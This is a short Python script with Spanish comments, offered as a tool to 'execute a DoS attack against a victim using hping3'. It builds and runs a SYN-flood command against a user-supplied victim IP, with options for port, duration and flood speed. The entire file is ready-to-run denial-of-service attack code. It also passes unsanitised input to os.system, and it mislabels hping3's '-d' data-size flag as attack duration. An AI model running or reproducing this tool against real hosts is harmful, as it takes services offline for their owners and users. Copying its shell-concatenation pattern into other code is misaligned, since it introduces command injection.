#!/usr/bin/python
# -*- coding: cp1252 -*-

# Autor: Gabriel Maci�
# Fecha: 14/12/2015

import sys
import logging
import os
import argparse
import time
import subprocess

##########################################
# DEFINICION DE VARIABLES Y CONSTANTES
##########################################

LOGFILENAME = 'DoS_attack.log'
LOGLEVEL = logging.DEBUG
LOGDIR = '.'

##########################################

if __name__ == '__main__':


    logging.basicConfig(
                        filename=LOGDIR + time.strftime('%y%m%d_%H.%M.%S_')+ LOGFILENAME,
                        level=logging.DEBUG,
                        format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s'
                        )
    log = logging.getLogger("DoSAttack")

    parser = argparse.ArgumentParser (description='Execute a DoS attack against a victim using hping3')
    parser.add_argument(dest='ipVictim', metavar='ipVictim', action='store', help='IP address of the victim', nargs=1)
    parser.add_argument('-d', dest='attackDuration', metavar='attackDuration(seconds)', action='store', default=30, type=int, help='default 30 seconds')
    parser.add_argument('-p', dest='destPort', metavar='destPort', action='store', default=80, type=int, help='default: 80 (http)')
    parser.add_argument('--speed', dest='attackSpeed', metavar='attackSpeed', action='store', choices=['fast','flood'], default='fast', help='fast or flood')
    args = parser.parse_args()

    

    log.info ('Iniciando DoS Attack contra ' + args.ipVictim[0] + ' a las: ' + time.strftime('%X %d/%m/%y'))
    
    # TODO: Comprobar si el ejecutable hping3 est� instalado en la maquina. Se asume por ahora que lo est� y est� en el path
    
    installed = True
    try: 
        subprocess.check_output('which hping3', shell=True)
    except subprocess.CalledProcessError as e:
        installed = False
        print 'hping3 is not installed in your system. Please, install it'
        #exit(-1)
    
    command = ('hping3 -w 64 -S' + 
                ' -d ' + str(args.attackDuration) +  
                ' -p ' + str(args.destPort) + 
                ' --' + args.attackSpeed + 
                ' ' + args.ipVictim[0])
    log.info ('Ejecutando comando: ' + command)
    os.system(command)
    log.info ('Fin de ataque a las: ' + time.strftime('%X %d/%m/%y'))